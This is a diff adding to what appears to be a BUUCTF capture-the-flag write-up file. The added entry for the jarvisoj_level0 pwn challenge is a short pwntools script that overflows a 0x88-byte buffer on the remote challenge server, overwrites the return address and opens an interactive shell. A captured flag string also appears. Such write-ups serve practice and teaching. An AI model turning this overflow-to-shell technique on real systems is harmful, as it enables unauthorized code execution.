@@ -249,6 +249,22 @@ flag{209acebf6324a09671abc31c869de72c}
 
 ## pwn
 
+### jarvisoj_level0
+
+```python
+from pwn import *
+# context.proxy = (socks.HTTP, 'proxy2.', 8080)
+sh = remote('node3.buuoj.cn',27627)
+
+retn = 0x0004005F4
+shellcode = 0x0400596
+
+payload = flat('a'* 0x88,  p64(shellcode))
+sh.sendline(payload)
+sh.interactive()
+```
+
+### 3
 
 ```c
 int vuln()
